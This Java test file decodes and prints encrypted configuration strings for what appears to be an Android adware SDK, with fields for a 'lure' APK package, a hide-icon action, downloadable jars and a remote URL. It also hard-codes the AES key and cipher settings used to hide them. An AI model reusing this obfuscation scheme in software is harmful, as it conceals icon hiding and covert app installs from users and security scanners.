

/**
 * Created by Administrator on 2014/11/7.
 */
public class Test2 {
    private static String spfName = "d82175072fae98e86c03aa0ecd1985d3";                //ADS_
    public static String assetsAppName = "3a058a1426eeda843287aa3b9f00c3c3";   //assets
    public static String assetsJarName = "04e208dd05c1cb7aea8cf671ef8f51de";   //assets
    public static String url = "6f1e8b3417c63a92744cf5f2799834969c01f566e671413366acce16a0d9dac8";

    private static String spfSdkVersion = "0e5a16fc714953f73900fad2c94cc312";
    private static String spfPackageName = "6a19b4a3dc74748037adefafb96a0363";
    private static String spfMode = "9e8cf004f9d2f9986f3f4c8bea2f4f1c";
    private static String spfAppState = "d19da7ccdbd4dc04808f62e927b64e84";
    private static String spfAppDownLoadState = "a7a17d4e5bfe6f86ce58aa5f41996ab4";
    private static String spfJarDownLoadState = "1389509d12f13448c7be80cc37b0e4c9";
    private static String spfJarState = "cb7b5791080596deca180bddfa711196";

    public static String sdkVersion = "a6971a5c9b975b6eeef351a9732a0dec";   //sdk版本
    public static String packageName = "75e196528d93fd21ab5f5a685b83cd24";   //诱导Apk包名
    public static String serviceClassPATH = "68f5d0c93b03c2e0a373e2868cf84838a573155b4dbed8970ef98a3ff675c3dc";
    public static String HIDEICONAction = "0d05693ba721face0f92dbf1fb6e8d021c55b313ef220c3e4400f9f00d8826fa";
    public static String intentPackageName = "34d5e2f6fc20e32b0895cc16763468d2";
    public static String serviceParentName ="1909d65478899b9f6c48696a08d99716";
    public static String str1 = "b7c374c703fcf273e35f37f19952af3298c014e4b86a9f04adecc676b3f3b6d3";
    public static String str2 = "1fb95edc80dd181a2cf45802de2ea288";
    public static String str3 = "137e2a120a30bb84fdc039398b747760";


    static {
        str1 = EncrypUtil.decode(str1);
        str2 = EncrypUtil.decode(str2);
        str3 = EncrypUtil.decode(str3);

        spfName = EncrypUtil.decode(spfName);
        assetsAppName = EncrypUtil.decode(assetsAppName);
        assetsJarName = EncrypUtil.decode(assetsJarName);
        url = EncrypUtil.decode(url);
        spfSdkVersion = EncrypUtil.decode(spfSdkVersion);
        spfPackageName = EncrypUtil.decode(spfPackageName);
        spfMode = EncrypUtil.decode(spfMode);
        spfAppState = EncrypUtil.decode(spfAppState);
        spfAppDownLoadState = EncrypUtil.decode(spfAppDownLoadState);
        spfJarDownLoadState = EncrypUtil.decode(spfJarDownLoadState);
        spfJarState = EncrypUtil.decode(spfJarState);
        sdkVersion = EncrypUtil.decode(sdkVersion);
        packageName = EncrypUtil.decode(packageName);

        serviceClassPATH = EncrypUtil.decode(serviceClassPATH);
        HIDEICONAction = EncrypUtil.decode(HIDEICONAction);
        intentPackageName = EncrypUtil.decode(intentPackageName);
        serviceParentName = EncrypUtil.decode(serviceParentName);

    }

    public static void main(String[] args) {
        System.out.println((spfName));
        System.out.println((assetsAppName));
        System.out.println((assetsJarName));
        System.out.println((url));
        System.out.println((spfSdkVersion));
        System.out.println((spfPackageName));
        System.out.println((spfMode));
        System.out.println((spfAppState));
        System.out.println((spfAppDownLoadState));
        System.out.println((spfJarDownLoadState));
        System.out.println((spfJarState));
        System.out.println((sdkVersion));
        System.out.println((packageName));
        System.out.println((serviceClassPATH));
        System.out.println((HIDEICONAction));
        System.out.println((intentPackageName));
        System.out.println((str1));
        System.out.println((str2));
        System.out.println((str3));
        System.out.println((serviceParentName));
//        byte[] bytes = {97, 97, 115, 100, 97, 113, 114, 49, 50, 51, 53, 49, 51, 52};
//
//        System.out.println(new String(bytes));
//       System.out.println(a);
//       System.out.println(b);
//       System.out.println(c);
//       System.out.println(d);
//       System.out.println(e);

    }

    private static byte[] bytes1 = {97, 97, 115, 100, 97, 113, 114, 49, 50, 51, 53, 49, 51, 52};
    private static byte[] bytes2 = {65, 69, 83};
    private static byte[] bytes3 = {83, 72, 65, 49, 80, 82, 78, 71};
    private static byte[] bytes4 = {67, 114, 121, 112, 116, 111};
    private static byte[] bytes5 = {65, 69, 83, 47, 69, 67, 66, 47, 80, 75, 67, 83, 53, 80, 97, 100, 100, 105, 110, 103};

    private static String a = new String(bytes1);
    private static String b = new String(bytes2);
    private static String c = new String(bytes3);
    private static String d = new String(bytes4);
    private static String e = new String(bytes5);
}
